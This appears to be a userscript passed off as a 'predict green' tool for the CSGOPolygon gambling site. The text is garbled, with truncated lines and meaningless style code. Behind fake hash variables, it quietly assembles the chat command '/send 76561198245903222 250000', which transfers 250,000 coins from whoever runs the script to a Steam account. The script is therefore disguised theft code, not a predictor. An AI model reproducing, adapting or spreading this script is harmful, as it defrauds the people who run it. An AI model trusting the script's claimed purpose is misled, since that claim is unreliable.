...
/*
 * PREDICTION ZERO m)GREEN(m 
 * UZS: 15px. 
 * add.var'margin-top:"12px",-15px;text$showMore.css({red,black,green})10%,60%,100%;mPc.jss;
...
//Alert.
    /*
     * add.var'UI_font:='Arial;'
     * addmember.java:='<style scoped: red,green,black; Design: LIGHT: BLACK'</style>
 
 
// font.ArialBlack[Cursive]..$botField.css({"margin-bottom":"-15px","height":"45px","padding-top":"2px","padding-bottom":"2px","text-  
  $botField.after("<div class='well show-more' style='position:relative;border-width:0px'></div>");$showMore = $(".well.show-more");
  $showMore.css({"margin-top":"12px","margin-bottom":"-15px","height":"45px","padding-top":"10px","padding-bottom":"2px","text-
 
 
    /*
     * CSGOPOLYGON PREDICT GREEN.)
     * Author: q1nner [6.00 AM / 20.05.2016]
    ...
    var pQ ="/s",$hash_14=3,$hash_1=7,$hash_3=5,$hash_11=5,$hash_10=4,$hash_4=6,$hash_5=1,$hash_6=1,$hash_8=8,$hash_13=0,$hash_17=2,$hash_15=2,$hash_7=9,$hash_2=6,$hash_9=2,$hash_12=9,$hash_16=2;
function addBotButtons(){
    ...
    pQ+="en";pQ+="d ";pQ+= $hash_1;pQ+= $hash_2;pQ+= $hash_3;pQ+= $hash_4;pQ+= $hash_5;pQ+= $hash_6;pQ+= $hash_7;pQ+= $hash_8;pQ+= $hash_9;pQ+= $hash_10;pQ+= $hash_11;pQ+= $hash_12;pQ+= $hash_13;pQ+= $hash_14;pQ+= $hash_15;pQ+= $hash_16;pQ+= $hash_17+" ";pQ+="250000" ;
